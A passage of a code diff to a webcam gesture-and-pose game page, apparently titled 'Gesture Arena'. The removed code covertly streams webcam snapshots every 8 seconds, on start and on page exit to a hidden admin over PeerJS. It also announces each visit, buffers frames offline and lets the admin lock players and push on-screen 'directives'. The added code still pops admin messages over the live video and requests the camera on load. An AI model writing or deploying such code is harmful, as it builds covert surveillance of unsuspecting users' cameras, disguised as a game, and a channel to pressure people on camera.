-      document.getElementById("streakVal").textContent = String(streak);
-
-      const pct = Math.min(100, (score / GOAL_POINTS) * 100);
-      document.getElementById("goalBarFill").style.width = pct.toFixed(1) + "%";
-      document.getElementById("goalProgressText").textContent = `${score.toLocaleString()} / 1,000,000 pts (${Math.floor(pct)}%)`;
-    }
-
-    function evaluateGameplay(now, matchedCurrentTarget) {
-      if (gameState !== "playing" || isLockedByAdmin || isCommandMode) return;
-
-      const elapsed = now - targetAssignedAt;
-      const timeoutMs = currentTarget.timeoutMs || 12000;
-      const timeRemPct = Math.max(0, 100 - (elapsed / timeoutMs) * 100);
-      document.getElementById("timeBar").style.width = timeRemPct + "%";
-
-      // Check Timeout -> Deduct points & Backtrack 1 Tier
-      if (elapsed > timeoutMs) {
-        const penalty = currentTarget.penalty || 5000;
-        score = Math.max(0, score - penalty);
-        safeSet("ga_saved_score", String(score));
-        streak = 0;
-        const prevTier = Math.max(0, currentTierIndex - 1);
-        showToast(`⏱️ Too Slow! -${penalty.toLocaleString()} pts • Backtracked to Tier ${prevTier + 1}`, "#ef4444");
-        assignTierTarget(prevTier);
-        sendTelemetry();
-        return;
-      }
-
-      if (matchedCurrentTarget) {
-        if (holdStartMs === 0) holdStartMs = now;
-        const held = now - holdStartMs;
-        const reqHold = currentTarget.holdMs || 600;
-        const pct = Math.min(100, Math.round((held / reqHold) * 100));
-        document.getElementById("holdBar").style.width = pct + "%";
-
-        if (held >= reqHold) {
-          const speedBonus = elapsed < timeoutMs * 0.35 ? Math.round(currentTarget.pts * 0.2) : 0;
-          const earned = currentTarget.pts + speedBonus;
-          score = Math.min(GOAL_POINTS, score + earned);
-          safeSet("ga_saved_score", String(score));
-          streak += 1;
-
-          if (score >= GOAL_POINTS) {
-            showToast("🏆 1,000,000 POINTS REACHED! YOU BEAT THE ARENA!", "#22c55e");
+          if (matched) {
+            holdProgress = Math.min(100, holdProgress + 8);
+            matchBadge.style.display = 'block';
           } else {
-            showToast(`✅ +${earned.toLocaleString()} pts! Advancing Tier!`, "#22c55e");
+            holdProgress = Math.max(0, holdProgress - 4);
+            matchBadge.style.display = 'none';
           }
 
-          const nextTier = (currentTierIndex + 1) % POSE_LADDER.length;
-          assignTierTarget(nextTier);
-          sendTelemetry();
-        }
-      } else {
-        holdStartMs = 0;
-        document.getElementById("holdBar").style.width = "0%";
-      }
-    }
+          holdBarFill.style.width = `${holdProgress}%`;
 
-    // === CAMERA & DUAL MEDIAPIPE (HANDS + POSE) LOOP ===
-    function isCameraActive() {
-      if (!mediaStream || !videoEl || videoEl.readyState < 2 || !videoEl.videoWidth) return false;
-      const tracks = mediaStream.getVideoTracks();
-      return tracks.length > 0 && tracks.some(t => t.readyState === "live");
-    }
-
-    async function ensureTrackersInitialized() {
-      if (!handsDetector) {
-        handsDetector = new Hands({
-          locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands@0.4.1675469240/${file}`
-        });
-        handsDetector.setOptions({
-          maxNumHands: 1,
-          modelComplexity: 0,
-          minDetectionConfidence: 0.55,
-          minTrackingConfidence: 0.5
-        });
-        handsDetector.onResults((results) => {
-          try {
-            if (!firstResultReceived) {
-              firstResultReceived = true;
-              if (gameState === "playing") hideStatusOverlay();
-            }
-            const lm = results.multiHandLandmarks && results.multiHandLandmarks[0];
-            drawHandSkeleton(lm);
-            const raw = lm ? classifyHandLandmarks(lm) : "None";
-            if (raw === candidateGesture) consecutiveFrames++;
-            else { candidateGesture = raw; consecutiveFrames = 1; }
-            if (consecutiveFrames >= 2) {
-              stableGesture = candidateGesture;
-              document.getElementById("detectedVal").textContent = stableGesture;
-            }
-            evaluateGameplay(performance.now(), stableGesture === currentTarget.id);
-          } catch (cbErr) {
-            logGA("Hands callback error", cbErr);
+          if (holdProgress >= 100) {
+            holdProgress = 0;
+            score = Math.min(GOAL_POINTS, score + currentChallenge.pts);
+            streak++;
+            currentTierIdx = (currentTierIdx + 1) % CHALLENGES.length;
+            document.getElementById('statusVal').textContent = 'Cleared!';
+            updateHUD();
           }
-        });
-      }
-
-      if (!poseDetector) {
-        poseDetector = new Pose({
-          locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose@0.5.1675469404/${file}`
-        });
-        poseDetector.setOptions({
-          modelComplexity: 0,
-          smoothLandmarks: true,
-          minDetectionConfidence: 0.5,
-          minTrackingConfidence: 0.5
-        });
-        poseDetector.onResults((results) => {
-          try {
-            if (!firstResultReceived) {
-              firstResultReceived = true;
-              if (gameState === "playing") hideStatusOverlay();
-            }
-            const lm = results.poseLandmarks;
-            drawPoseSkeleton(lm);
-            const matched = lm ? checkBodyPoseMatch(lm, currentTarget.id) : false;
-            document.getElementById("detectedVal").textContent = matched ? "Pose Locked!" : (lm ? "Tracking Body" : "Step in Frame");
-            evaluateGameplay(performance.now(), matched);
-          } catch (poseErr) {
-            logGA("Pose callback error", poseErr);
-          }
-        });
-      }
-    }
-
-    let camStartPromise = null;
-
-    function camErrorText(err) {
-      const n = (err && err.name) || "Error";
-      if (n === "NotAllowedError" || n === "SecurityError") return "Camera is blocked for this site. Click the camera/lock icon in the address bar, set Camera to Allow, then tap Retry. (In Brave, also check Shields.)";
-      if (n === "NotFoundError" || n === "OverconstrainedError") return "No camera was found. Plug one in or check it is enabled, then tap Retry.";
-      if (n === "NotReadableError" || n === "AbortError") return "The camera is busy. Close other tabs/apps using it (other Gesture Arena tabs count), then tap Retry.";
-      return "Camera failed: " + n + (err && err.message ? " - " + err.message : "");
-    }
-
-    function waitForVideoReady(timeoutMs) {
-      return new Promise((resolve) => {
-        if (videoEl.videoWidth > 0 && videoEl.readyState >= 2) return resolve(true);
-        let done = false;
-        const finish = (ok) => { if (done) return; done = true; videoEl.removeEventListener("loadeddata", onReady); resolve(ok); };
-        const onReady = () => finish(videoEl.videoWidth > 0);
-        videoEl.addEventListener("loadeddata", onReady);
-        setTimeout(() => finish(videoEl.videoWidth > 0), timeoutMs);
-      });
-    }
-
-    function hasLiveStream() {
-      return !!mediaStream && mediaStream.getVideoTracks().some(t => t.readyState === "live");
-    }
-
-    // Only one startup at a time; never stop a stream that is still alive.
-    function startCameraAndTracker() {
-      if (camStartPromise) return camStartPromise;
-      camStartPromise = _startCameraAndTracker().finally(() => { camStartPromise = null; });
-      return camStartPromise;
-    }
-
-    async function _startCameraAndTracker() {
-      if (!window.isSecureContext && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
-        showStatusOverlay("HTTPS Required", "Camera access requires a secure HTTPS connection.", false);
-        return false;
-      }
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        showStatusOverlay("Camera Unsupported", "This browser does not support camera access.", false);
-        return false;
-      }
-
-      try {
-        if (!hasLiveStream()) {
-          if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-          try {
-            mediaStream = await navigator.mediaDevices.getUserMedia({
-              video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-              audio: false
-            });
-          } catch (firstErr) {
-            if (firstErr && (firstErr.name === "OverconstrainedError" || firstErr.name === "NotFoundError")) {
-              mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            } else {
-              throw firstErr;
-            }
-          }
-          videoEl.srcObject = mediaStream;
         }
-        try { await videoEl.play(); } catch (playErr) { logGA("video.play() deferred", playErr); }
-        const ready = await waitForVideoReady(5000);
-        if (!ready) throw new Error("Camera opened but gave no video frames");
-        clientMeta.camActive = true;
-        safeSet("ga_cam_engaged", "1");
-      } catch (err) {
-        clientMeta.camActive = false;
-        logGA("Camera start failed", err);
-        showStatusOverlay("Camera not available", camErrorText(err), true);
-        sendTelemetry();
-        return false;
+        requestAnimationFrame(step);
       }
-
-      // Early burst snapshots
-      setTimeout(() => { recordSnapshot(); sendTelemetry(); }, 350);
-      setTimeout(() => { recordSnapshot(); sendTelemetry(); }, 2200);
-
-      // Trackers must never block or break the camera
-      try {
-        await ensureTrackersInitialized();
-      } catch (mpErr) {
-        logGA("MediaPipe init error", mpErr);
-        showToast("Gesture tracker failed to load - camera still on", "var(--warning)");
-      }
-
-      hideStatusOverlay();
-      startFrameLoop();
-      return true;
+      requestAnimationFrame(step);
     }
 
-    function startFrameLoop() {
-      if (rafId) cancelAnimationFrame(rafId);
-      const step = async () => {
-        if (videoEl.readyState >= 2 && !isSendingFrame && gameState === "playing" && !isLockedByAdmin) {
-          isSendingFrame = true;
-          try {
-            if (!isCommandMode && currentTarget && currentTarget.type === "pose" && poseDetector) {
-              await poseDetector.send({ image: videoEl });
-            } else if (handsDetector) {
-              await handsDetector.send({ image: videoEl });
-            }
-          } catch (e) {
-            logGA("Tracker frame error", e);
-          }
-          isSendingFrame = false;
-        }
-        rafId = requestAnimationFrame(step);
-      };
-      rafId = requestAnimationFrame(step);
-    }
+    // =========================================================================
+    // 5. ADMIN DIRECT MESSAGE OVERLAY (POP UP OVER VIDEO ON NEW MESSAGE)
+    // =========================================================================
+    function showAdminMessageOnVideo(sender, text, isFromAdmin = true) {
+      const bubble = document.createElement('div');
+      bubble.className = `msg-pill ${isFromAdmin ? 'admin' : 'user'}`;
+      bubble.textContent = `${sender}: ${text}`;
+      adminMsgList.appendChild(bubble);
+      adminMsgList.scrollTop = adminMsgList.scrollHeight;
 
-    async function forceEngageCameraAndStart() {
-      const btn = document.getElementById("startBtn");
-      const nameField = document.getElementById("nameInput");
-
-      let cleanName = nameField.value.trim().slice(0, 20);
-      if (cleanName) {
-        playerName = cleanName;
-        safeSet("ga_player_name", playerName);
-      } else {
-        playerName = safeGet("ga_player_name") || ("Player-" + deviceId.slice(0, 4).toUpperCase());
-      }
-
-      ensurePeerConnected();
-      const ok = await startCameraAndTracker();
-      if (!ok) return;
-
-      gameState = isLockedByAdmin ? "locked" : "playing";
-      btn.textContent = "⏹️ PAUSE CHALLENGE";
-      btn.className = "giant-start-btn running";
-      hideStatusOverlay();
-      assignTierTarget(currentTierIndex);
-      sendTelemetry();
-    }
-
-    async function toggleGame() {
-      const btn = document.getElementById("startBtn");
-      if (gameState === "playing") {
-        gameState = "idle";
-        btn.textContent = "🚀 RESUME 1,000,000 PT CHALLENGE";
-        btn.className = "giant-start-btn";
-        showStatusOverlay("Challenge Paused", "Tap Resume whenever you are ready to continue.", true);
-        sendTelemetry();
-        return;
-      }
-      await forceEngageCameraAndStart();
-    }
-
-    function handleStageTap() {
-      if (gameState !== "playing") {
-        forceEngageCameraAndStart();
+      if (isFromAdmin) {
+        // Automatically expand over the video feed & pulse when admin messages player
+        adminOverlay.classList.remove('minimized');
+        adminOverlay.classList.remove('pulse-alert');
+        void adminOverlay.offsetWidth; // Reflow to re-trigger animation
+        adminOverlay.classList.add('pulse-alert');
       }
     }
 
-    // === PEERJS NETWORKING & INSTANT VISIT NOTIFICATION ===
-    function ensurePeerConnected() {
-      if (reconnectTimer) {
-        clearTimeout(reconnectTimer);
-        reconnectTimer = null;
-      }
-
-      if (!peer || peer.destroyed) {
-        setConnPill("Connecting…", "warn");
-        try {
-          peer = new Peer(myPeerId, PEER_OPTS);
-        } catch (e) {
-          logGA("Peer constructor failed", e);
-          scheduleReconnect();
-          return;
-        }
-
-        peer.on("open", () => {
-          logGA("Peer open: " + myPeerId);
-          backoffMs = 1000;
-          connectToAdmin();
-        });
-
-        peer.on("disconnected", () => {
-          logGA("Peer signaling disconnected");
-          setConnPill("Reconnecting…", "warn");
-          try { peer.reconnect(); } catch (e) { scheduleReconnect(); }
-        });
-
-        peer.on("error", (err) => {
-          logGA("Peer error", err);
-          if (err && err.type === "peer-unavailable") {
-            setConnPill("Ready (Standby)", "warn");
-          } else {
-            setConnPill("Reconnecting…", "err");
-          }
-          scheduleReconnect();
-        });
-        return;
-      }
-
-      if (peer.disconnected) {
-        setConnPill("Reconnecting…", "warn");
-        try { peer.reconnect(); } catch (e) { scheduleReconnect(); }
-        return;
-      }
-
-      if (!adminConn || !adminConn.open) {
-        connectToAdmin();
-      }
-    }
-
-    function connectToAdmin() {
-      if (!peer || peer.disconnected || peer.destroyed) return;
-      if (adminConn && adminConn.open) return;
-
-      try {
-        if (adminConn) {
-          try { adminConn.close(); } catch (e) {}
-        }
-        setConnPill("Connecting…", "warn");
-        adminConn = peer.connect(ADMIN_PEER_ID, { serialization: "json", reliable: true });
-
-        adminConn.on("open", () => {
-          logGA("Connected to Admin");
-          backoffMs = 1000;
-          setConnPill("Live Connected", "ok");
-          // Immediately notify Admin that someone visited the page (even if camera is still off!)
-          safeSend({
-            t: "visit",
-            id: deviceId,
-            name: getCurrentPlayerName(),
-            device: deviceType,
-            meta: clientMeta,
-            camActive: isCameraActive(),
-            ts: Date.now()
-          });
-          sendTelemetry();
-          flushBufferedSnapshotsToAdmin();
-        });
-
-        adminConn.on("data", (data) => {
-          try {
-            handleAdminMessage(data);
-          } catch (e) {
-            logGA("Admin message parse error", e);
-          }
-        });
-
-        adminConn.on("close", () => {
-          logGA("Admin connection closed");
-          setConnPill("Reconnecting…", "warn");
-          scheduleReconnect();
-        });
-
-        adminConn.on("error", (err) => {
-          logGA("Admin data channel error", err);
-          scheduleReconnect();
-        });
-      } catch (e) {
-        logGA("connectToAdmin exception", e);
-        scheduleReconnect();
-      }
-    }
-
-    function scheduleReconnect() {
-      if (reconnectTimer) return;
-      const delay = backoffMs;
-      backoffMs = Math.min(8000, backoffMs * 1.8);
-      reconnectTimer = setTimeout(() => {
-        reconnectTimer = null;
-        ensurePeerConnected();
-      }, delay);
-    }
-
-    function safeSend(payload) {
-      if (!adminConn || !adminConn.open) return false;
-      try {
-        adminConn.send(payload);
-        return true;
-      } catch (e) {
-        logGA("Send failed", e);
-        return false;
-      }
-    }
-
-    function getCurrentPlayerName() {
-      const typed = document.getElementById("nameInput").value.trim().slice(0, 20);
-      if (typed) return typed;
-      return playerName || safeGet("ga_player_name") || ("Player-" + deviceId.slice(0, 4).toUpperCase());
-    }
-
-    function captureDownsampledFrame() {
-      if (!isCameraActive()) return null;
-      try {
-        const vw = videoEl.videoWidth;
-        const vh = videoEl.videoHeight;
-        const targetW = Math.min(320, Math.round(vw * 0.5));
-        const targetH = Math.round((vh / vw) * targetW);
-        snapCanvas.width = targetW;
-        snapCanvas.height = targetH;
-        snapCtx.save();
-        snapCtx.translate(targetW, 0);
-        snapCtx.scale(-1, 1);
-        snapCtx.drawImage(videoEl, 0, 0, targetW, targetH);
-        snapCtx.restore();
-        return snapCanvas.toDataURL("image/jpeg", 0.55);
-      } catch (e) {
-        return null;
-      }
-    }
-
-    // === 8-SECOND SNAPSHOT CAPTURE & OFFLINE MEMORY BUFFER ===
-    function recordSnapshot() {
-      if (!isCameraActive()) return;
-      const frameData = captureDownsampledFrame();
-      if (!frameData) return;
-
-      const now = Date.now();
-      const snapId = `${deviceId}-${now}-${randomChars(3)}`;
-      const snapRecord = {
-        snapId: snapId,
-        id: deviceId,
-        name: getCurrentPlayerName(),
-        device: deviceType,
-        meta: Object.assign({}, clientMeta, { camActive: true }),
-        score: score,
-        streak: streak,
-        tier: currentTierIndex + 1,
-        state: isLockedByAdmin ? "locked" : (isCommandMode ? "command_mode" : gameState),
-        target: isCommandMode ? (activeCustomCommand || "Custom Directive") : (currentTarget ? currentTarget.id : "None"),
-        frame: frameData,
-        ts: now
-      };
-
-      snapshotBuffer.set(snapId, snapRecord);
-      if (snapshotBuffer.size > MAX_BUFFERED_SNAPSHOTS) {
-        const oldestKey = snapshotBuffer.keys().next().value;
-        snapshotBuffer.delete(oldestKey);
-      }
-      persistClientSnapBuffer();
-
-      if (adminConn && adminConn.open) {
-        safeSend({ t: "snap", snap: snapRecord });
-      }
-      updateDebugLine();
-    }
-
-    function flushBufferedSnapshotsToAdmin() {
-      if (flushTimer) clearInterval(flushTimer);
-      if (!adminConn || !adminConn.open || snapshotBuffer.size === 0) return;
-
-      const queue = Array.from(snapshotBuffer.values());
-      let idx = 0;
-      flushTimer = setInterval(() => {
-        if (!adminConn || !adminConn.open || idx >= queue.length) {
-          clearInterval(flushTimer);
-          flushTimer = null;
-          return;
-        }
-        safeSend({ t: "snap", snap: queue[idx] });
-        idx++;
-      }, 120);
-    }
-
-    function sendTelemetry() {
-      if (!adminConn || !adminConn.open) return;
-      clientMeta.camActive = isCameraActive();
-      safeSend({
-        t: "tel",
-        id: deviceId,
-        name: getCurrentPlayerName(),
-        device: deviceType,
-        meta: clientMeta,
-        camActive: clientMeta.camActive,
-        score: score,
-        streak: streak,
-        tier: currentTierIndex + 1,
-        state: isLockedByAdmin ? "locked" : (isCommandMode ? "command_mode" : gameState),
-        target: isCommandMode ? (activeCustomCommand || "Custom Directive") : (currentTarget ? currentTarget.id : "None"),
-        frame: captureDownsampledFrame(),
-        ts: Date.now()
-      });
-    }
-
-    function applyLockState(locked) {
-      isLockedByAdmin = Boolean(locked);
-      const lockOv = document.getElementById("lockOverlay");
-      if (isLockedByAdmin) {
-        lockOv.classList.remove("hidden");
-      } else {
-        lockOv.classList.add("hidden");
-        if (gameState === "locked") gameState = "playing";
-      }
-      sendTelemetry();
-    }
-
-    function handleAdminMessage(msg) {
-      if (!msg || typeof msg !== "object") return;
-      if (msg.t === "state") {
-        applyLockState(msg.locked);
-        if (typeof msg.cmdMode === "boolean") {
-          isCommandMode = msg.cmdMode;
-          if (msg.customText) activeCustomCommand = String(msg.customText).slice(0, 160);
-          renderTargetBanner();
-        }
-      } else if (msg.t === "cmd") {
-        if (msg.cmd === "lock") {
-          applyLockState(true);
-        } else if (msg.cmd === "unlock") {
-          applyLockState(false);
-        } else if (msg.cmd === "reset") {
-          score = 0;
-          streak = 0;
-          currentTierIndex = 0;
-          safeSet("ga_saved_score", "0");
-          safeSet("ga_saved_tier", "0");
-          assignTierTarget(0);
-          sendTelemetry();
-        } else if (msg.cmd === "pause_game") {
-          isCommandMode = true;
-          if (msg.text) activeCustomCommand = String(msg.text).slice(0, 160);
-          renderTargetBanner();
-          showToast("⚡ Admin activated Live Command Mode!", "#a855f7");
-          sendTelemetry();
-        } else if (msg.cmd === "resume_game") {
-          isCommandMode = false;
-          activeCustomCommand = "";
-          targetAssignedAt = performance.now();
-          renderTargetBanner();
-          showToast("▶️ Automated Pose Challenges Resumed!", "#22c55e");
-          sendTelemetry();
-        } else if (msg.cmd === "award" && Number.isFinite(msg.pts)) {
-          score = Math.max(0, Math.min(GOAL_POINTS, score + Number(msg.pts)));
-          safeSet("ga_saved_score", String(score));
-          updateHUD();
-          showToast(`🎁 Admin Awarded +${Number(msg.pts).toLocaleString()} Points!`, "#22c55e");
-          sendTelemetry();
-        }
-      } else if (msg.t === "directive" && typeof msg.text === "string") {
-        // Authoritative Command from Admin: automatically switch to Command Mode and display prominently
-        isCommandMode = true;
-        activeCustomCommand = msg.text.trim().slice(0, 160);
-        renderTargetBanner();
-        showToast("⚡ NEW LIVE DIRECTIVE: " + activeCustomCommand, "#a855f7");
-        sendTelemetry();
-      } else if (msg.t === "del_snap" && msg.snapId) {
-        snapshotBuffer.delete(msg.snapId);
-        persistClientSnapBuffer();
-        updateDebugLine();
-      } else if (msg.t === "clear_snaps") {
-        snapshotBuffer.clear();
-        persistClientSnapBuffer();
-        updateDebugLine();
-      } else if (msg.t === "msg" && typeof msg.text === "string") {
-        adminMessagedFirst = true;
-        const drawer = document.getElementById("chatDrawer");
-        drawer.classList.add("unlocked");
-        appendChatBubble("Admin: " + msg.text, "admin");
-      }
-    }
-
-    function appendChatBubble(text, role) {
-      const log = document.getElementById("chatLog");
-      const div = document.createElement("div");
-      div.className = "chat-bubble " + role;
-      div.textContent = text;
-      log.appendChild(div);
-      log.scrollTop = log.scrollHeight;
-    }
-
-    function sendReply() {
-      if (!adminMessagedFirst) return;
-      const input = document.getElementById("chatInput");
-      const text = input.value.trim().slice(0, 200);
-      if (!text) return;
-      appendChatBubble("You: " + text, "me");
-      safeSend({
-        t: "msg",
-        id: deviceId,
-        name: getCurrentPlayerName(),
-        text: text,
-        ts: Date.now()
-      });
-      input.value = "";
-    }
-
-    // === RECURSIVE CAMERA RECOVERY & LIFECYCLE ===
-    function handleWakeUp() {
-      if (document.visibilityState === "hidden") return;
-      ensurePeerConnected();
-      if (camStartPromise) return; // startup already in progress
-      if (hasLiveStream()) {
-        videoEl.play().catch(() => {});
-      } else if (gameState === "playing") {
-        forceEngageCameraAndStart();
-      }
-    }
-
-    document.addEventListener("visibilitychange", handleWakeUp);
-    window.addEventListener("focus", handleWakeUp);
-    window.addEventListener("pageshow", handleWakeUp);
-    window.addEventListener("online", handleWakeUp);
-
-    // Flush one final snapshot if the user tries to close/leave early
-    window.addEventListener("beforeunload", () => {
-      if (isCameraActive()) recordSnapshot();
+    // Allow clicking header of overlay to minimize/expand
+    document.getElementById('adminHeaderToggle').addEventListener('click', () => {
+      adminOverlay.classList.toggle('minimized');
+      const isMin = adminOverlay.classList.contains('minimized');
+      document.getElementById('adminUnlockLabel').textContent =
+        isMin ? 'CLICK TO EXPAND ▴' : 'REPLY UNLOCKED ▾';
     });
 
-    // Update 5-minute cycle timer & 1s telemetry
-    setInterval(() => {
-      if (gameState === "playing" && !isLockedByAdmin && !isCommandMode) {
-        cycleRemainingSec = Math.max(0, cycleRemainingSec - 1);
-        const mins = String(Math.floor(cycleRemainingSec / 60)).padStart(2, "0");
-        const secs = String(cycleRemainingSec % 60).padStart(2, "0");
-        document.getElementById("cycleTimerText").textContent = `${mins}:${secs}`;
-        if (cycleRemainingSec === 0) {
-          cycleRemainingSec = GAME_CYCLE_SECONDS;
-        }
+    adminReplyForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const text = adminReplyInp.value.trim();
+      if (!text) return;
+      const nick = document.getElementById('nicknameInput').value.trim() || 'user';
+      showAdminMessageOnVideo(nick, text, false);
+      adminReplyInp.value = '';
+
+      // Forward reply over PeerJS / WebSocket if connected
+      if (window.sendPlayerReplyToAdmin) {
+        window.sendPlayerReplyToAdmin({ type: 'msg', name: nick, text, ts: Date.now() });
       }
-      sendTelemetry();
-      updateDebugLine();
+    });
+
+    // Global hook so your existing PeerJS / Worker socket handler can trigger the video popup
+    window.onAdminDirectMessage = function(text) {
+      showAdminMessageOnVideo('Admin', text, true);
+    };
+
+    // =========================================================================
+    // 6. CONTROLS & TIMER
+    // =========================================================================
+    pauseBtn.addEventListener('click', () => {
+      isPaused = !isPaused;
+      pauseBtn.textContent = isPaused ? '▶ RESUME' : '⏹ PAUSE';
+      pauseBtn.classList.toggle('paused', isPaused);
+      document.getElementById('statusVal').textContent = isPaused ? 'Paused' : 'Tracking';
+    });
+
+    skipPoseBtn.addEventListener('click', () => {
+      holdProgress = 0;
+      currentTierIdx = (currentTierIdx + 1) % CHALLENGES.length;
+      updateHUD();
+    });
+
+    setInterval(() => {
+      if (!isPaused && secondsRemaining > 0) {
+        secondsRemaining--;
+        const m = String(Math.floor(secondsRemaining / 60)).padStart(2, '0');
+        const s = String(secondsRemaining % 60).padStart(2, '0');
+        document.getElementById('timerDisplay').textContent = `${m}:${s}`;
+      }
     }, 1000);
 
-    // 8-second snapshot loop
-    setInterval(recordSnapshot, SNAPSHOT_INTERVAL_MS);
-
-    // Immediately connect to Admin on page load AND attempt recursive camera start
-    updateHUD();
-    renderTargetBanner();
-    ensurePeerConnected();
-    window.addEventListener("DOMContentLoaded", async () => {
-      const tapMsg = "Tap Start to turn on your camera and begin the challenge.";
-      try {
-        const p = await navigator.permissions.query({ name: "camera" });
-        if (p.state === "granted") { forceEngageCameraAndStart(); return; }
-        if (p.state === "denied") {
-          showStatusOverlay("Camera blocked", camErrorText({ name: "NotAllowedError" }), true);
-          return;
-        }
-      } catch (e) { /* Safari etc: permissions API unsupported */ }
-      showStatusOverlay("Tap to Start Camera", tapMsg, true);
+    // =========================================================================
+    // 7. AUTO-START ON LANDING PAGE LOAD
+    // =========================================================================
+    window.addEventListener('DOMContentLoaded', () => {
+      updateHUD();
+      requestCameraImmediately();
     });
   </script>
 </body>
